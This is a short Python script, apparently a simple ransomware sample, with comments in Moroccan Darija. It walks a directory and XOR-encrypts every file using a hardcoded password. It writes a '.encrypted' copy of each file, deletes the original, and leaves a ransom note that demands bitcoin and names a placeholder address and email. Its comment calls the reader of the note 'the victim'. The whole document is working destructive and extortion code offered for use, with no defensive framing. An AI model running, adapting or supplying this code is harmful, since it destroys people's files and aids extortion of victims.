import os
import sys

directory = sys.argv[1]
password = b'hat hna passwd ta3ak'

for root, dirs, files in os.walk(directory):
    for file in files:
        file_path = os.path.join(root, file)
        encrypted_file_path = file_path + '.encrypted'
        with open(file_path, 'rb') as f:
            with open(encrypted_file_path, 'wb') as ef:
                ef.write(password)
                byte = f.read(1)
                while byte:
                    ef.write(bytes([byte[0] ^ password[0]]))
                    byte = f.read(1)
        os.remove(file_path)

# mohim hna rah lmissage li ghadi t9olo l victim 
ransom_note = 'All your files have been encrypted. To get the decryption key, send $1000 worth of bitcoin to this address: 1234567890. Once the payment is confirmed, send an email to this address: hacker@example.com with your Bitcoin address and we\'ll send you the decryption key.'
with open('ransom_note.txt', 'w') as f:
    f.write(ransom_note)
